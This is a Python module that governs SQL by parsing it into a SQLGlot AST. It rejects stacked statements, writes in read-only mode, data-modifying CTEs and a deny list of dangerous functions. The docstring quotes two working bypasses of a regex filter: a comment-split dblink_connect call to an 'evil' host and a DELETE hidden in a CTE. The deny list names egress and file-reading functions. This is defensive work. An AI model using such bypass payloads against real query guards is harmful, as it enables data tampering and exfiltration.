"""AST-based SQL governance.

Textual classification of SQL is not securable. Taking the first whitespace
token and grepping for dangerous names loses to trivial, *valid* SQL:

    SELECT db/**/link_connect('host=evil')            -- comment splits the name
    WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d   -- verb is WITH, it deletes

Both are real bypasses of the previous regex classifier (verified). The fix is
not a better regex — it is to stop reading SQL as text. This module parses the
statement into a **SQLGlot AST** and reasons over nodes:

* the statement must parse to exactly one expression (no stacked statements);
* the top-level node must be a read (``SELECT`` / ``UNION`` / ``WITH``-select);
* **no** DML/DDL node may appear *anywhere* in the tree — this is what catches a
  data-modifying CTE, which the top-level verb hides;
* dangerous functions are matched on the parsed function node, so comments,
  newlines, and casing inside the call cannot hide them;
* table/column references are extracted from the AST, enabling column-level
  authorization that text matching fundamentally cannot express.

Comments are stripped by the parser, so comment-based evasion disappears by
construction rather than by another pattern.
"""

from __future__ import annotations

from dataclasses import dataclass, field

import sqlglot
from sqlglot import exp

# Node types that mutate data or schema. Their presence ANYWHERE in a read
# statement's tree (e.g. inside a CTE) makes it a write.
_MUTATING_NODES: tuple[type, ...] = tuple(
    node for node in (
        getattr(exp, name, None) for name in (
            "Insert", "Update", "Delete", "Drop", "Create", "Alter", "TruncateTable",
            "Grant", "Merge", "Copy", "AlterTable",
        )
    ) if node is not None
)

# Read-shaped roots. A `WITH ... SELECT` parses as Select with a `with` arg.
_READ_ROOTS: tuple[type, ...] = tuple(
    node for node in (getattr(exp, n, None) for n in
                      # Subquery covers a parenthesized read: `(SELECT ...)`.
                      ("Select", "Union", "Except", "Intersect", "Subquery"))
    if node is not None
)

# Function families that a read-only transaction still executes but which burn
# resources or open a network/filesystem side-channel the egress guard can't see.
_DANGEROUS_FUNCTIONS = frozenset({
    "dblink", "dblink_connect", "dblink_exec", "dblink_open", "dblink_send_query",
    "pg_sleep", "pg_sleep_for", "pg_sleep_until",
    "pg_read_file", "pg_read_binary_file", "pg_ls_dir", "pg_stat_file",
    "lo_import", "lo_export",
    "load_file", "benchmark", "sleep",
    "sys_eval", "sys_exec",
    "query_to_xml",          # can be pointed at arbitrary SQL
    "xmlhttp", "http_get", "http_post",  # http extension = egress
})
_DANGEROUS_PREFIXES = ("dblink", "postgres_fdw", "sys_")


@dataclass
class SQLAnalysis:
    """Structural facts about a statement, derived from its AST."""

    ok: bool
    verb: str = ""
    error: str | None = None
    tables: set[str] = field(default_factory=set)
    columns: set[str] = field(default_factory=set)
    functions: set[str] = field(default_factory=set)
    is_read: bool = False

    def as_dict(self) -> dict:
        return {"ok": self.ok, "verb": self.verb, "error": self.error,
                "tables": sorted(self.tables), "columns": sorted(self.columns),
                "functions": sorted(self.functions), "is_read": self.is_read}


def _dialect_for(dsn: str) -> str | None:
    """Map a SQLAlchemy DSN to a SQLGlot dialect so parsing is dialect-correct."""
    head = (dsn or "").split(":", 1)[0].lower()
    if head.startswith("postgres"):
        return "postgres"
    if head.startswith("mysql") or head.startswith("mariadb"):
        return "mysql"
    if head.startswith("sqlite"):
        return "sqlite"
    if head.startswith("mssql") or head.startswith("pyodbc"):
        return "tsql"
    if head.startswith("snowflake"):
        return "snowflake"
    if head.startswith("bigquery"):
        return "bigquery"
    return None  # SQLGlot's permissive default


def _is_dangerous(name: str) -> bool:
    lowered = name.lower()
    return (lowered in _DANGEROUS_FUNCTIONS
            or any(lowered.startswith(p) for p in _DANGEROUS_PREFIXES))


def _collect(tree) -> tuple[set[str], set[str], set[str]]:
    """Extract (tables, columns, function names) from a parsed statement."""
    tables, columns, functions = set(), set(), set()
    for table in tree.find_all(exp.Table):
        if table.name:
            tables.add(f"{table.db}.{table.name}".lstrip(".").lower())
    for column in tree.find_all(exp.Column):
        if column.name:
            columns.add(column.name.lower())
    for func in tree.find_all(exp.Func):
        # Anonymous funcs carry the raw name; builtins expose a sql_name().
        name = func.args.get("this") if isinstance(func, exp.Anonymous) else None
        if isinstance(name, str):
            functions.add(name.lower())
        else:
            try:
                functions.add(func.sql_name().lower())
            except Exception:  # noqa: BLE001 - defensive: never fail on odd nodes
                pass
    return tables, columns, functions


def analyze(sql: str, *, dialect: str | None = None, read_only: bool = True) -> SQLAnalysis:
    """Parse ``sql`` and decide whether it is a permissible statement.

    ``read_only=True`` enforces a pure read (the governed query path);
    ``read_only=False`` permits single-statement DML but still refuses DDL and
    dangerous functions (the governed write path).
    """
    if not sql or not sql.strip():
        return SQLAnalysis(ok=False, error="empty query")

    try:
        statements = [s for s in sqlglot.parse(sql, dialect=dialect) if s is not None]
    except sqlglot.ParseError as exc:
        first = str(exc).splitlines()[0][:160]
        return SQLAnalysis(ok=False, error=f"could not parse SQL: {first}")

    if not statements:
        return SQLAnalysis(ok=False, error="empty query")
    if len(statements) > 1:
        return SQLAnalysis(
            ok=False, error="multiple statements are not allowed; submit one at a time")

    tree = statements[0]
    verb = type(tree).__name__.upper()
    tables, columns, functions = _collect(tree)
    is_read = isinstance(tree, _READ_ROOTS)

    def fail(msg: str) -> SQLAnalysis:
        return SQLAnalysis(ok=False, verb=verb, error=msg, tables=tables,
                           columns=columns, functions=functions, is_read=is_read)

    # Dangerous functions — matched on parsed nodes, so `db/**/link_connect`
    # (which the parser normalizes) and case/newline tricks cannot hide.
    for name in sorted(functions):
        if _is_dangerous(name):
            return fail(f"'{name}' is not permitted — it can exhaust resources or open a "
                        "network/filesystem side-channel that bypasses egress controls")

    # Writing query output to a file is a filesystem escape from a "read".
    into = tree.find(exp.Into) if read_only else None
    if into is not None and (into.args.get("file") or into.args.get("outfile")
                             or into.args.get("dumpfile")):
        return fail("writing query output to a file is not permitted")

    mutating = tree.find(*_MUTATING_NODES) if _MUTATING_NODES else None

    if read_only:
        if not is_read:
            return fail(f"'{verb}' is not permitted — this connector is read-only "
                        "(only SELECT / WITH ... SELECT are allowed)")
        # THE key AST win: a data-modifying CTE has a read-shaped root but a
        # write node inside. Text classification cannot see this.
        if mutating is not None:
            return fail(f"statement contains a {type(mutating).__name__.upper()} "
                        "operation inside a read query (data-modifying CTE) — refused")
        return SQLAnalysis(ok=True, verb="SELECT", tables=tables, columns=columns,
                           functions=functions, is_read=True)

    # Write path: exactly one DML root, no DDL anywhere.
    allowed_write = tuple(n for n in (getattr(exp, x, None)
                                      for x in ("Insert", "Update", "Delete")) if n is not None)
    if not isinstance(tree, allowed_write):
        return fail(f"'{verb}' is not a permitted write — only INSERT, UPDATE, DELETE "
                    "are allowed (DDL and reads are refused)")
    ddl = tuple(n for n in _MUTATING_NODES if n not in allowed_write)
    if ddl and tree.find(*ddl) is not None:
        return fail("DDL is not permitted on a governed write")
    return SQLAnalysis(ok=True, verb=verb.upper(), tables=tables, columns=columns,
                       functions=functions, is_read=False)


def check_column_access(analysis: SQLAnalysis, denied_columns: set[str]) -> str | None:
    """Column-level authorization — impossible without an AST.

    Returns a refusal reason if the statement references a denied column.
    """
    if not denied_columns:
        return None
    hit = {c for c in analysis.columns if c in {d.lower() for d in denied_columns}}
    if hit:
        return (f"query references restricted column(s): {', '.join(sorted(hit))}")
    return None
